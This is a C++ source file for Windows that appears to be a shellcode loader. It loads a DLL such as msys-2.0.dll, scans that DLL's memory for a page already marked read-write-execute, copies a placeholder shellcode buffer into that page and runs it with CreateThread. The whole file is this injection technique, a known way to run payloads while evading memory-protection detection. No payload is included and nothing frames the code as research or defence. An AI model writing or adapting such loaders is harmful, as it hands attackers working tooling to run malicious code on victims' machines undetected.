#include <cstring>
#include <iostream>
#include <Windows.h>
#include <stdio.h>
#include <Psapi.h>

typedef void (*ShellcodeFunc)();

LPVOID RWX_Section_Finder(MODULEINFO& memoryInfo) {
	HANDLE hProcess = GetCurrentProcess();

	MEMORY_BASIC_INFORMATION bi{};

	DWORD_PTR currentAddress = reinterpret_cast<DWORD_PTR>(memoryInfo.lpBaseOfDll);
	
	// Iterate over the pages, to find RWX page
	while (VirtualQueryEx(hProcess, reinterpret_cast<LPCVOID>(currentAddress), &bi, sizeof(bi))) {

		if (bi.Protect == PAGE_EXECUTE_READWRITE || bi.Protect == PAGE_EXECUTE_WRITECOPY) {
			return bi.BaseAddress;
		}

		currentAddress += bi.RegionSize;
	}

	return nullptr;
}

int main()
{
	unsigned char shellcodeRaw[] = { "--YOUR SHELLCODE GOES HERE--" };

	const char* dllPath = "--YOUR PATH TO x86 msys-2.0.dll GOES HERE--";

	// Load the dll
	HMODULE hDll = LoadLibraryA(dllPath);
	if (hDll == NULL)
	{
		std::cout << "Error Loading dll - " << GetLastError() << std::endl;
		return 1;
	}

	// To get the base addr of the loaded dll in mem
	MODULEINFO moduleInfo;
	if (!GetModuleInformation(GetCurrentProcess(), hDll, &moduleInfo, sizeof(MODULEINFO)))
	{
		std::cout << "Error getting module info - " << GetLastError() << std::endl;
		return 1;
	}

	// Find the address of the RWX section
	LPVOID rwxSectionAddr = RWX_Section_Finder(moduleInfo);

	if (!rwxSectionAddr) {
		std::cout << "Error getting RWX offset - " << GetLastError() << std::endl;
		return 1;
	}

	std::cout << "RWX section found at the address: " << rwxSectionAddr << std::endl;

	// Write the code to the section
	CopyMemory(rwxSectionAddr, shellcodeRaw, sizeof(shellcodeRaw));

	HANDLE hThread = nullptr;
	DWORD threadID{};
	ShellcodeFunc func = (ShellcodeFunc)rwxSectionAddr;

	// Create the func as __stdcall convenvtion (CreateThread convention)
	if ((hThread = CreateThread(nullptr, 0, (PTHREAD_START_ROUTINE)func, nullptr, 0, &threadID)) == INVALID_HANDLE_VALUE) {
		std::cout << "Error executing CreateThread - " << GetLastError() << std::endl;
		return 1;
	}
	
	std::cout << "Thread ID: " << threadID << std::endl;

	// Wait until response from return
	WaitForSingleObject(hThread, INFINITE);

	CloseHandle(hThread);

	return 0;
}
